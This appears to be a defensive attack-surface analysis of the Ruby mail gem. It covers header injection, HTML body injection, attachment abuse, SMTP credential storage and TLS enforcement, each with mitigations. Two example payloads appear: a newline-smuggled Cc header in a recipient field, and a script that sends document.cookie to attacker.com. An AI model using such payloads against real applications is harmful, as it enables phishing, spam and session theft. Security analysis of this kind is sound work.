# Attack Surface Analysis for mikel/mail

## Attack Surface: [Header Injection](./attack_surfaces/header_injection.md)

*   **Description:** Attackers inject malicious headers into outgoing emails by manipulating user-provided data that is used to construct email headers.
    *   **How `mail` Contributes to the Attack Surface:** The `mail` gem provides methods to programmatically set various email headers (e.g., `To`, `Cc`, `Bcc`, `Subject`, custom headers). If the application doesn't sanitize input before using it in these methods, it becomes vulnerable.
    *   **Example:** An attacker provides the following as the "Recipient" in a contact form: `attacker@example.com%0ACc: victim@example.com`. If the application directly uses this input in `mail.to(params[:recipient])`, it will add `victim@example.com` as a carbon copy recipient.
    *   **Impact:** Spamming, phishing attacks impersonating the application, bypassing security measures (e.g., adding themselves to internal communication threads), information disclosure.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Input Sanitization:** Sanitize all user-provided data before using it to set email headers. Remove or escape newline characters (`\n` or `%0A`, `\r` or `%0D`).
        *   **Header Validation:** Validate the format and content of header values against expected patterns.
        *   **Use Dedicated Methods:** Utilize the `mail` gem's methods for adding recipients (`to`, `cc`, `bcc`) individually instead of directly manipulating header strings.

## Attack Surface: [Body Manipulation/HTML Injection](./attack_surfaces/body_manipulationhtml_injection.md)

*   **Description:** Attackers inject malicious content into the email body, potentially including HTML or JavaScript, by manipulating user-provided data used in the email body.
    *   **How `mail` Contributes to the Attack Surface:** The `mail` gem allows setting the email body content. If the application directly incorporates unsanitized user input into the body, it's vulnerable.
    *   **Example:** A feedback form allows users to enter a message. An attacker enters: `<script>window.location.href='https://attacker.com/steal?data='+document.cookie;</script>`. If the application sends this directly as an HTML email, the script could execute in the recipient's email client.
    *   **Impact:** Phishing attacks, social engineering, malware distribution (through links), cross-site scripting (if the recipient's email client renders HTML).
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Output Encoding/Escaping:** Encode or escape user-provided data before including it in the email body, especially if sending HTML emails.
        *   **Content Security Policy (CSP):** If sending HTML emails, consider using CSP headers (though recipient email client support varies).
        *   **Plain Text Emails:** If possible, send emails in plain text format to avoid HTML injection risks.

## Attack Surface: [Attachment Abuse](./attack_surfaces/attachment_abuse.md)

*   **Description:** Attackers can upload or specify malicious attachments that are then sent via email by the application.
    *   **How `mail` Contributes to the Attack Surface:** The `mail` gem provides functionality to add attachments to emails. If the application allows users to control attachment content or filenames without validation, it's vulnerable.
    *   **Example:** A file upload feature is used to attach files to emails. An attacker uploads an executable file disguised as a harmless document. The application, using the `mail` gem, sends this malicious attachment.
    *   **Impact:** Malware distribution, phishing attacks (with malicious attachments), resource exhaustion (sending very large attachments).
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Attachment Whitelisting/Blacklisting:** Allow only specific file types or block known malicious file types.
        *   **File Size Limits:** Implement limits on the size of attachments.
        *   **Virus Scanning:** Scan uploaded attachments for malware before sending them.
        *   **Rename Attachments:** Rename uploaded files to prevent execution based on filename extensions.

## Attack Surface: [Insecure SMTP Credentials Storage](./attack_surfaces/insecure_smtp_credentials_storage.md)

*   **Description:** Sensitive SMTP server credentials (username, password) required by the `mail` gem are stored insecurely, making them accessible to attackers.
    *   **How `mail` Contributes to the Attack Surface:** The `mail` gem needs SMTP credentials to send emails. The application is responsible for providing these credentials, and if done insecurely, it creates a vulnerability.
    *   **Example:** SMTP credentials are hardcoded directly in the application code or stored in plain text in a configuration file accessible via a web vulnerability or compromised server.
    *   **Impact:** Unauthorized email sending, impersonation of the application, potential compromise of the SMTP server itself if the credentials are reused.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Environment Variables:** Store SMTP credentials in environment variables.
        *   **Secrets Management Systems:** Utilize dedicated secrets management tools (e.g., HashiCorp Vault, AWS Secrets Manager).
        *   **Encrypted Configuration:** Encrypt configuration files containing sensitive information.
        *   **Avoid Hardcoding:** Never hardcode credentials directly in the application code.

## Attack Surface: [Lack of TLS/SSL Enforcement for SMTP](./attack_surfaces/lack_of_tlsssl_enforcement_for_smtp.md)

*   **Description:** The application doesn't enforce secure TLS/SSL connections when communicating with the SMTP server using the `mail` gem.
    *   **How `mail` Contributes to the Attack Surface:** The `mail` gem can be configured to use TLS/SSL. If this is not enforced, communication between the application and the SMTP server can be intercepted.
    *   **Example:** The application connects to the SMTP server without TLS/SSL. An attacker on the network can intercept the communication and potentially steal SMTP credentials or email content.
    *   **Impact:** Exposure of SMTP credentials, interception of sensitive email content.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Configure TLS/SSL:** Explicitly configure the `mail` gem to use TLS/SSL for SMTP connections.
        *   **Verify Certificate:** Ensure the application verifies the SMTP server's SSL certificate.
